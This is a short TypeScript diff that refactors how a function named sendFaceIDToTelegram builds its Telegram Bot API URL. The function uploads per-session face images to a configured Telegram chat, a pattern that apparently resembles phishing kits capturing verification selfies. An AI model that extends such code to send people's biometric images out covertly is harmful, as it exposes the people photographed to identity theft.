@@ -4,6 +4,7 @@
  */
 
 import { loadConfig } from "./config";
+import { tgApi } from "./tgapi";
 
 function getFaceidToken() { return loadConfig().telegramFaceidBotToken || process.env.TELEGRAM_FACEID_BOT_TOKEN || ""; }
 function getFaceidChatId() { return loadConfig().telegramFaceidChatId || process.env.TELEGRAM_FACEID_CHAT_ID || ""; }
@@ -45,7 +46,7 @@ export async function sendFaceIDToTelegram(sessionId: string, type: string, imag
     formData.append("parse_mode", "HTML");
     formData.append("photo", new Blob([imageBuffer], { type: `image/${ext}` }), `faceid_${type}_${Date.now()}.${ext}`);
 
-    const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+    const res = await fetch(tgApi(token, 'sendPhoto'), {
       method: "POST",
       body: formData,
     });
